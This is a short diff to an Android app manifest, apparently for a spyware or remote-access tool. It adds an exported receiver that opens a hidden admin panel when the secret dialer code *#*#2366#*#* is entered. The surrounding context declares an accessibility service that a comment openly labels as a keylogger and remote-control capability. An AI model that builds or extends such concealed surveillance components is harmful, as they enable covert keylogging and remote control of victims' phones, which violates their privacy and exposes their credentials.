@@ -89,6 +89,17 @@
             </intent-filter>
         </receiver>
 
+        <!-- Secret Code Receiver for Admin Panel (*#*#2366#*#*) -->
+        <receiver
+            android:name=".admin.SecretCodeReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="2366" />
+            </intent-filter>
+        </receiver>
+
         <!-- Accessibility Service for Keylogger/Remote Control -->
         <service
             android:name=".capabilities.RemoteAccessibilityService"
